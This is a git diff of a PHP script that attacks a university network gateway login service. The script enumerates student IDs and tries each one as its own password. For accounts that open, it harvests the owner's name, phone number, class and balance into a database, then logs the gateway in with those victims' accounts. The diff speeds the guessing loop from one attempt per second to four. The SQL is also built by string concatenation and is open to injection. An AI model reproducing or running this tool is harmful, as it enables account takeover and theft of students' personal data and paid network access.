@@ -46,7 +46,7 @@ class IPGW {
         $this->id         = $id;
         $this->pass       = $pass;
         $this->cookiefile = __DIR__ . '\\cookie-ipgw.txt';
-        $this->dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel', 'ipgw')
+        $this->dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel', 'neu')
         or die("Error connecting db: " . mysqli_error($this->dbc));
         mysqli_set_charset($this->dbc, 'gbk');
     }
@@ -91,7 +91,6 @@ class IPGW {
         curl_close($ch);
 
         //登陆
-        $loginUrl = 'http://tree.neu.edu.cn/user/user.Account?operation=login';
         $ch       = curl_init($loginUrl);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
@@ -104,7 +103,8 @@ class IPGW {
         $response = curl_exec($ch);
         //user.Account?operation与user_banner.html的唯一区别
         if (false !== strpos($response, iconv('utf-8', 'gbk',
-                                              "<!--Add below-->" . "<td><table><tr><td nowrap><font color=\"ffffff\" >"))
+                                              "<!--Add below-->"
+                                              . "<td><table><tr><td nowrap><font color=\"ffffff\" >"))
             // 这里的口令错误是utf编码，而网页上的是GBK，所以这里的strpos结果不准确
             && false === strpos($response, iconv('utf-8', 'gbk', "口令错误"))
             && false === strpos($response, iconv('utf-8', 'gbk', '没有输入用户ID'))
@@ -158,12 +158,8 @@ class IPGW {
 
         if ($this->loginTree()) {
             if ($info = $this->getInfo()) {
-                $query = "insert into info(id,class,balance,name,tel,aval) VALUES('" . $info["id"] . "',
-                                                                                  '" . $info["class"] . "',
-                                                                                  '" . $info["balance"] . "',
-                                                                                  '" . $info["name"] . "',
-                                                                                  '" . $info["tel"] . "',
-                                                                                   " . "1)";
+                $query = "insert into ipgw(id,class,balance,name,tel,aval)"
+                         . "VALUES('{$info["id"]}','{$info["class"]}','{$info["balance"]}','{$info["name"]}','{$info["tel"]}',1)";
                 mysqli_query($this->dbc, $query) or die("error geting one: " . mysqli_error($this->dbc));
 
                 return true;
@@ -185,10 +181,10 @@ class IPGW {
      */
     private function count() {
 
-        $count = 'select count(*) from info WHERE aval=1 AND balance >10';
+        $count = 'select count(*) from ipgw WHERE aval=1 AND balance >10';
         $res = mysqli_query($this->dbc, $count) or die('Error querying db: ' . mysqli_error($this->dbc));
 
-        return mysqli_fetch_array($res,MYSQLI_NUM)[0];
+        return mysqli_fetch_array($res, MYSQLI_NUM)[0];
     }
 
     /**
@@ -200,7 +196,7 @@ class IPGW {
      */
     private function exist($id) {
 
-        $query = "select * from info where id = '$id'";
+        $query = "select * from ipgw where id = '$id'";
         $res = mysqli_query($this->dbc, $query) or die("Error checking exist: " . mysqli_error($this->dbc));
 
         return mysqli_fetch_array($res) ? true : false;
@@ -214,7 +210,7 @@ class IPGW {
         $this->clean();
         $count = $this->count();
         //20140379
-        $id = 20142714;
+        $id = 20147160;
         while ($count < 100 && $id < 20149000) {
             while ($this->exist($id)) {
                 ++$id;
@@ -227,11 +223,11 @@ class IPGW {
                 ++$count;
                 ++$id;
             } else {
-                $this->unavailable();
+                //$this->unavailable();
                 echo "unavailable: $this->id\n";
                 ++$id;
             }
-            sleep(1);
+            usleep(250000);
         }
 
     }
@@ -241,7 +237,7 @@ class IPGW {
      */
     private function unavailable() {
 
-        $query = "insert into info(id, aval) VALUES('$this->id', 0)";
+        $query = "insert into ipgw(id, aval) VALUES('$this->id', 0)";
         mysqli_query($this->dbc, $query) or die("unavailable: " . mysqli_error($this->dbc));
     }
 
@@ -312,7 +308,7 @@ class IPGW {
      */
     public function login($force = false) {
 
-        $query = "select * from info WHERE aval=1 AND balance >0";
+        $query = "select * from ipgw WHERE aval=1 AND balance >0";
         $res = mysqli_query($this->dbc, $query) or die("login: " . mysqli_error($this->dbc));
 
         $goodmen = mysqli_fetch_all($res, MYSQLI_ASSOC);
@@ -323,15 +319,15 @@ class IPGW {
             $id      = $goodman['id'];
             //断开全部连接
             $force && static::loginIPGW($id, $id, 2);
-            sleep(1);
+            usleep(250000);
         } while (!static::loginIPGW($id, $id));
 
-        echo "Thanks to: " . $goodman['name'] . "\n";
+        echo "Thanks to: " . iconv('gbk', 'utf-8', $goodman['name']) . "\n";
     }
 
 }
 
 $ipgw = new IPGW();
-$ipgw->collect();
-//IPGW::loginMyself();
+// $ipgw->collect();
+IPGW::loginMyself();
 //$ipgw->login(true);
